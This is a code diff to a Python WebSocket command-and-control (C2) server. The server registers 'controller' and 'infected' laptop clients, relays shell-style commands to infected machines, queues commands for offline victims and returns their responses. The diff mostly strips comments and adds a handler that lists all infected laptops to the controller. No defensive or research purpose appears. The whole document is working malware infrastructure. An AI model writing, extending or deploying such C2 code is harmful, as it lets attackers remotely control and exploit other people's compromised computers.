@@ -28,18 +28,16 @@ async def register_client(websocket, role, client_id, data=None):
     clients[client_id] = {
         'websocket': websocket,
         'last_seen': datetime.now(),
-        'role': role,  # Store the role (controller or infected)
-        'data': data or {},  # Store additional data for infected laptops
-        'messages': []  # For storing unsent messages
+        'role': role,
+        'data': data,
+        'messages': []
     }
     logging.info(f"Registered new {role}: {client_id} with data: {data}")
-    return client_id
 
 # Relay messages between control and infected laptops
 async def relay_messages(websocket, client_id, role):
     while True:
         try:
-            # Receive message from the client
             message = await websocket.recv()
             data = json.loads(message)
             logging.info(f"Received message from {client_id} ({role}): {data}")
@@ -47,7 +45,6 @@ async def relay_messages(websocket, client_id, role):
             cleanup_old_messages()  # Clean up old messages before processing new ones
 
             if data.get("type") == "command" and role == "controller":
-                # Controller sends a command to an infected laptop
                 target_id = data['target']
                 command = data['command']
                 command_type = data['command_type']
@@ -70,21 +67,16 @@ async def relay_messages(websocket, client_id, role):
                         'response': None
                     }
 
-                    # Send the command to the target
                     await target_ws.send(json.dumps(new_message))
-                    messages.append(new_message)  # Log the message
+                    messages.append(new_message)
                     logging.info(f"Command sent to target {target_id}: {new_message}")
-
                 else:
-                    # If the target is not available, queue the message
                     clients[client_id]['messages'].append(data)
                     logging.info(f"Client {target_id} is not connected. Command queued.")
 
             elif data.get("type") == "response" and role == "infected":
-                # Infected laptop sends a response back to the controller
                 command_id = data['command_id']
                 response = data['response']
-
                 logging.info(f"Processing response for command ID {command_id}: {response}")
 
                 # Find the original command and update it with the response
@@ -95,12 +87,22 @@ async def relay_messages(websocket, client_id, role):
                         logging.info(f"Updated message with response: {msg}")
                         break
 
-                # Relay the response back to the originating client (controller)
                 origin_id = msg['origin']
                 if origin_id in clients:
                     origin_ws = clients[origin_id]['websocket']
                     await origin_ws.send(json.dumps(msg))
                     logging.info(f"Response relayed to origin {origin_id}: {msg}")
+
+            elif data.get("type") == "request_client_list" and role == "controller":
+                clients_list = {client_id: {
+                    'websocket': client['websocket'],
+                    'last_seen': client['last_seen'],
+                    'role': client['role'],
+                    'data': client.get('data', {})
+                } for client_id, client in clients.items()}
+
+                await websocket.send(json.dumps({'type': 'infected_list', 'infected_laptops': clients_list}))
+
 
         except websockets.ConnectionClosed:
             logging.info(f"Client {client_id} ({role}) disconnected.")
@@ -111,21 +113,17 @@ async def relay_messages(websocket, client_id, role):
 
 # Handle new connections
 async def connection_handler(websocket, path):
-    client_id = None  # Initialize client_id to None
+    client_id = None
     try:
-        # First message must specify the role and client ID
         initial_message = await websocket.recv()
         initial_data = json.loads(initial_message)
 
         role = initial_data['role']
-        client_id = initial_data['id']  # Assign client_id after parsing the initial message
+        client_id = initial_data['id']
 
-        # If the client is an infected laptop, extract additional data
         data = initial_data.get('data') if role == 'infected' else None
 
         await register_client(websocket, role, client_id, data)
-        logging.info(f"New {role} connected: {client_id} with data: {data}")
-
         await relay_messages(websocket, client_id, role)
     except websockets.ConnectionClosed:
         logging.info(f"Connection closed for client: {client_id if client_id else 'unknown client'}")
@@ -138,25 +136,23 @@ async def connection_handler(websocket, path):
 def get_local_ip():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
-        # Doesn't actually send data, just connects to determine the IP address
         s.connect(("8.8.8.8", 80))
         ip = s.getsockname()[0]
     except Exception:
-        ip = "127.0.0.1"  # Fallback to localhost if something goes wrong
+        ip = "127.0.0.1"
     finally:
         s.close()
     return ip
 
 # Start the WebSocket server
 async def main():
-    ip_address = get_local_ip()  # Retrieve the IP address
-    port = 6857  # Define the port
+    ip_address = get_local_ip()
+    port = 6857
 
     logging.info(f"Server listening on 0.0.0.0:{port}")
     logging.info(f"Server at {ip_address}:{port}")
 
     async with websockets.serve(connection_handler, "0.0.0.0", port):
-        logging.debug("C2 WebSocket server is running...")
         await asyncio.Future()  # Run forever
 
 if __name__ == "__main__":
